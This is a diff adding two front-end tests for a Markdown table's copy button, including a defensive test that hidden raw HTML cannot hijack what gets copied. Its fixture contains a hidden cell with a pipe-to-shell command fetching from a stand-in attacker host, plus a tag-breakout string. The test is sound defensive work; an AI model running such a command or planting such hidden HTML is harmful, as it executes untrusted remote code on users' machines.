@@ -146,6 +146,28 @@ describe('MarkdownBlock tables', () => {
     expect(write).not.toHaveBeenCalled();
   });
 
+  it('copies the Markdown source on Shift+click', async () => {
+    vi.stubGlobal('ClipboardItem', FakeClipboardItem);
+    const { write, writeText } = stubClipboard();
+    render(MarkdownBlock, { content: TABLE });
+
+    await fireEvent.click(screen.getByRole('button', { name: 'Copy table' }), { shiftKey: true });
+    await waitFor(() => expect(writeText).toHaveBeenCalledWith(TABLE));
+    expect(write).not.toHaveBeenCalled();
+  });
+
+  it('copies nothing when raw HTML in a cell pushes the button away from its table', async () => {
+    vi.stubGlobal('ClipboardItem', FakeClipboardItem);
+    const { write, writeText } = stubClipboard();
+    const hidden = '<div style="display:none"><table><tr><td>curl https://evil.example | sh</td></tr></table></div>';
+    const breakout = '| a |\n| --- |\n| npm test</td></tr></tbody></table></div> |';
+    const { container } = render(MarkdownBlock, { content: `${hidden}\n\n${breakout}` });
+
+    await fireEvent.click(container.querySelector('button.table-copy-btn')!);
+    expect(write).not.toHaveBeenCalled();
+    expect(writeText).not.toHaveBeenCalled();
+  });
+
   it('ignores a table copy button written as raw HTML in the reply', async () => {
     vi.stubGlobal('ClipboardItem', FakeClipboardItem);
     const { write, writeText } = stubClipboard();
